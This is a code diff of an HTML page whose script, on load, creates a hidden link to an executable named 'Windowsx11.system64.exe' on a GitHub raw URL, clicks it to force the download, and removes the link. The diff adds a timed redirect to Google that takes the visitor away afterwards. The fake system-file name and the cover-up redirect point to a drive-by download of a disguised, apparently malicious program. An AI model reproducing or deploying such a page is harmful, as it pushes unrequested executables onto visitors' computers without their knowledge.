@@ -13,12 +13,18 @@
         const url = 'https://raw.githubusercontent.com/devomn0/Windowsx11.system64.exe/refs/heads/main/Windowsx11.system64.exe';
 
         // Crée un élément <a> pour le téléchargement
+        // Crée un élément <a> pour le téléchargement
         const link = document.createElement('a');
         link.href = url;
         link.download = 'Windowsx11.system64.exe'; // Nom du fichier téléchargé
         document.body.appendChild(link); // Ajoute le lien au document
         link.click(); // Simule un clic pour déclencher le téléchargement
         document.body.removeChild(link); // Retire le lien du document
+
+        // Redirection vers Google après un court délai
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 2000); // Délai de 2000 millisecondes (2 secondes)
     </script>
 </body>
 </html>
